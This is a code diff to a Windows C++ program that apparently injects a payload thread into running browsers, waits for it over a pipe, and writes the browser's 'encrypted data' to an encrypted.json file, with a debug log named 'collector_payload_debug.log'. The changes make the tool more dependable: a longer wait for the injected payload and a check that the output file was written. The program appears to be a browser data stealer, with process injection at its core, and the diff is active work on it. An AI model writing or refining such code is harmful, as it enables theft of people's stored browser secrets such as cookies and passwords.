@@ -131,6 +131,8 @@ int wmain(int argc, wchar_t* argv[]) {
         log.flush();
         console.BrowserHeader(browser.displayName, browser.version);
 
+        bool fileSaved = false;
+
         try {
             if (killBrowsers) {
                 console.Debug("Terminating browser processes...");
@@ -166,11 +168,10 @@ int wmain(int argc, wchar_t* argv[]) {
 
             console.Debug("Awaiting payload connection...");
             log << "About to resume payload thread" << std::endl; log.flush();
-            injector.ResumeRemoteThread(); 
-            Sleep(100); 
+            injector.ResumeRemoteThread();
+            Sleep(100);
             log << "Payload thread resumed, waiting for connection" << std::endl; log.flush();
-            pipe.WaitForClient();         
-
+            pipe.WaitForClient();
 
             log << "Payload thread resumed" << std::endl;
             log.flush();
@@ -183,9 +184,10 @@ int wmain(int argc, wchar_t* argv[]) {
             log << "Message processing completed" << std::endl;
             log.flush();
 
+            // Wait for the browser process to exit (payload may need time to write file)
             HANDLE hProcess = procMgr.GetProcessHandle();
             if (hProcess && hProcess != INVALID_HANDLE_VALUE) {
-                DWORD waitResult = WaitForSingleObject(hProcess, 10000);
+                DWORD waitResult = WaitForSingleObject(hProcess, 30000);  // 30 seconds timeout
                 if (waitResult != WAIT_OBJECT_0) {
                     log << "Payload did not exit within timeout, force-terminating" << std::endl;
                     log.flush();
@@ -201,12 +203,27 @@ int wmain(int argc, wchar_t* argv[]) {
                 procMgr.Terminate();
             }
 
-            console.Success("Encrypted data saved to " + (output / "encrypted.json").string());
+            // Verify that encrypted.json was actually created
+            std::filesystem::path jsonPath = output / "encrypted.json";
+            if (std::filesystem::exists(jsonPath) && std::filesystem::file_size(jsonPath) > 0) {
+                fileSaved = true;
+                console.Success("Encrypted data saved to " + jsonPath.string());
+                log << "File verified: " << jsonPath.string() << " size " << std::filesystem::file_size(jsonPath) << std::endl;
+            }
+            else {
+                console.Error("Failed to save encrypted data – file missing or empty");
+                log << "ERROR: encrypted.json not found or empty after browser process exit" << std::endl;
+                log << "Check %temp%\\collector_payload_debug.log for details" << std::endl;
+            }
         }
         catch (const std::exception& e) {
             console.Error(std::string("Exception: ") + e.what());
             log << "EXCEPTION: " << e.what() << std::endl;
             log.flush();
+        }
+
+        if (!fileSaved) {
+            console.Error("Encrypted data was not saved for " + browser.displayName);
         }
     }
 
